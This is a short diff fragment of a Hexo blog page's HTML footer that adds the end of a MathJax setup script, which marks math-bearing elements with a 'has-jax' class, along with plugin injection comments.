+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
 </body>
 </html>
